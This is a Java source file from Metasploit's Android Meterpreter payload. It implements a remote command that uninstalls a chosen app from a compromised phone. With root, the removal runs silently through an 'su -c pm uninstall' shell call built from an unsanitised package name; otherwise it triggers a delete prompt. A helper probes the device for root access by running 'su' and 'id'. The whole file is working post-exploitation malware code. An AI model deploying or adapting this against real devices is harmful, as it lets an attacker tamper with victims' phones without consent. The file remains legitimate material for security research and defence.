package com.metasploit.meterpreter.android;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.PowerManager;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.List;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class appapi_app_uninstall implements Command {
    private static final int TLV_EXTENSIONS                = 20000;
    private static final int TLV_TYPE_APP_USEROOT          = TLVPacket.TLV_META_TYPE_BOOL   | (TLV_EXTENSIONS + 2910);
    private static final int TLV_TYPE_APP_PACKAGE_NAME     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2913);
    private static final int TLV_TYPE_APP_ENUM             = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2915);

    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        // AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        // final Context context = androidMeterpreter.getContext();

        String PackageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);

        if (!isPackageInstalled(PackageName))
        {
            response.addOverflow(TLV_TYPE_APP_ENUM, 11); // Package not found
            return ERROR_SUCCESS;
        }

        // Use Root .?
        if (request.getBooleanValue(TLV_TYPE_APP_USEROOT))
        {
            if (canRunRootCommands())
            {
                Runtime.getRuntime().exec(new String[] {"su", "-c", "pm uninstall " + PackageName});
                response.addOverflow(TLV_TYPE_APP_ENUM, 1); // Good
            }
            else
            {
                response.addOverflow(TLV_TYPE_APP_ENUM, 3); // Root access rejected
            }
        }
        else
        {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + PackageName));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            response.addOverflow(TLV_TYPE_APP_ENUM, 1); // Good
        }


        return ERROR_SUCCESS;
    }

    private boolean isPackageInstalled(String packageName) {
        boolean found = true;
        try
        {
            context.getPackageManager().getPackageInfo(packageName, 0);
        }
        catch (PackageManager.NameNotFoundException e)
        {
            found = false;
        }

        return found;
    }

    private boolean canRunRootCommands() {
        boolean retval;
        Process suProcess;

        try
        {
            suProcess = Runtime.getRuntime().exec("su");

            DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
            DataInputStream osRes = new DataInputStream(suProcess.getInputStream());

            // Getting the id of the current user to check if this is root
            os.writeBytes("id\n");
            os.flush();

            String currUid = osRes.readLine();
            boolean exitSu;
            if (currUid == null)
            {
                retval = false;
                exitSu = false;
                //Log.d("ROOT", "Can't get root access or denied by user");
            }
            else if (currUid.contains("uid=0"))
            {
                retval = true;
                exitSu = true;
                //Log.d("ROOT", "Root access granted");
            }
            else
            {
                retval = false;
                exitSu = true;
                //Log.d("ROOT", "Root access rejected: " + currUid);
            }

            if (exitSu)
            {
                os.writeBytes("exit\n");
                os.flush();
            }
        }
        catch (Exception e)
        {
            // Can't get root !
            // Probably broken pipe exception on trying to write to output stream (os) after su failed, meaning that the device is not rooted

            retval = false;
            //Log.d("ROOT", "Root access rejected [" + e.getClass().getName() + "] : " + e.getMessage());
        }

        return retval;
    }
}
